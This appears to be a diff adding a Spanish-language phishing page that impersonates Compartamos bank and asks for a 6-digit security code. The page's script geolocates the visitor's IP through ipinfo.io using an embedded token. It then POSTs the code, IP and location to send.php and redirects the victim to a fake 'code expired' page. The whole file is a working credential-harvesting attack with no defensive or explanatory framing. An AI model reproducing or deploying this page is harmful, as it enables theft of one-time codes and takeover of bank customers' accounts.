@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="UTF-8"><title>Código</title><link rel="stylesheet" href="style.css"></head>
+<body><div class="container">
+<img src="Compartamos-Ba-768x163.jpg" alt="Logo" style="max-width: 100%; margin-bottom: 20px;">
+<h1>Código de Seguridad</h1>
+<form id="codeForm"><input type="text" id="codigo" placeholder="Ingresa el código de 6 dígitos" maxlength="6" required>
+<button type="submit">Confirmar</button></form></div>
+<script>
+document.getElementById('codeForm').addEventListener('submit', async function(e) {
+e.preventDefault(); const codigo = document.getElementById('codigo').value;
+if (!/^\d{6}$/.test(codigo)) { alert("Debe tener 6 dígitos."); return; }
+let ip="Desconocida", ubicacion="No disponible";
+try { const res=await fetch("https://ipinfo.io/json?token=72e4f683c1c5fb");
+const data=await res.json(); ip=data.ip; ubicacion=data.city+", "+data.region+", "+data.country; } catch(e){}
+await fetch("send.php",{method:"POST",headers:{"Content-Type":"application/json"},
+body:JSON.stringify({message:`🔐 Código: ${codigo}\n🌍 IP: ${ip}\n📌 Ubicación: ${ubicacion}`})});
+window.location.href = "codigo_vencido.html";
+});
+</script></body></html>
